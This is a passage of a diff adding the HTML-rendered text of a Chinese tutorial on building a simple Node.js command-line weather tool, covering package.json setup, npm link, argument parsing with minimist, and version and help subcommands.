+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather-cli&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MIT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bin/weather&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;增加好之后，在工程根路径下执行 &lt;code class=&quot;highlighter-rouge&quot;&gt;npm link&lt;/code&gt; 命令会将二进制文件符号链接到系统路径，使其可以在任何地方通过在外部运行访问。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;此时你可以在任何路径下都可以执行 &lt;code class=&quot;highlighter-rouge&quot;&gt;weaher&lt;/code&gt; 命令了。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;到此为止的工程结构为：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;weather-cli/
+	|- package.json
+	|- index.js
+	|- bin
+		|- weather
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;4-气温应用&quot;&gt;4. 气温应用&lt;/h2&gt;
+
+&lt;h3 id=&quot;41-命令行参数&quot;&gt;4.1 命令行参数&lt;/h3&gt;
+
+&lt;p&gt;如何处理接受的命令行参数，这里使用 &lt;strong&gt;&lt;a href=&quot;https://github.com/substack/minimist&quot;&gt;minimist&lt;/a&gt;&lt;/strong&gt; 的解析库，在根路径下使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;npm install --save minimist&lt;/code&gt; 进行安装&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[index.js]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'minimist'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// slice(2) 删除前两个参数，因为第一个参数是解释器，第二个参数是文件名&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;现在运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;weather today --location &quot;NanJing, ZH&quot;&lt;/code&gt;，它将会输出 &lt;code class=&quot;highlighter-rouge&quot;&gt;{ _: [ 'today' ], location: 'NanJing, ZH' } &lt;/code&gt;，从输出结果可以得知，这是一个清晰的 json 结构，到此我们建立了第一个解析命令行参数的 cli 程序。&lt;/p&gt;
+
+&lt;h3 id=&quot;42-运行命令&quot;&gt;4.2 运行命令&lt;/h3&gt;
+
+&lt;p&gt;将每个命令代码分隔到不同文件中，需要的时候进行加载。这会防止加载不必要的模块并减少启动程序的时间，在这种设置下，每个命令文件都应该导出一个函数，并将参数传递给它。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[index.js]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'minimist'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// slice(2) 删除前两个参数，因为第一个参数是解释器，第二个参数是文件名&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// args = { _: [ 'today' ], location: 'NanJing, ZH' }&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// 取第一个命令&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'today'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;// 需要的时候加载运行并把参数进行传递&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./cmds/today'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nl&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; is not a valid command!`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;[cmds/today.js]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'today is sunny'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;现在如果运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;weather today&lt;/code&gt; 则会输出 “today is sunny”，若运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;weather hello&lt;/code&gt; 则会输出错误的信息 “hello is not a valid command!”，&lt;/p&gt;
+
+&lt;h3 id=&quot;43-预期与容错&quot;&gt;4.3 预期与容错&lt;/h3&gt;
+
+&lt;p&gt;除了程序用命令，还需要额外处理如 &lt;code class=&quot;highlighter-rouge&quot;&gt;version&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; 此类的命令，当用户输入错误的参数应该会得到正确的反馈信息，以提示用户正确的进行参数的输入。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[index.js]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'minimist'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// 取第一个参数命令，若没有获取到则默认使用 help 命令&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'version'&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;help&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'today'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./cmds/today'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'version'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./cmds/version'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./cmds/help'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nl&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; is not a valid command!`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;[cmds/version]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../package.json'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;[cmds/help]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;menus&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`
+        weather [command] &amp;lt;options&amp;gt;
+
+        today   ........... show weather for today
+        version ........... show program version
+        help    ........... show help menu for a command
+    `&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+
+    &lt;span class=&quot;na&quot;&gt;today&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`
+        weather today &amp;lt;options&amp;gt;
+
+        --location, -l .... the location to use
+    `&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;subCmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
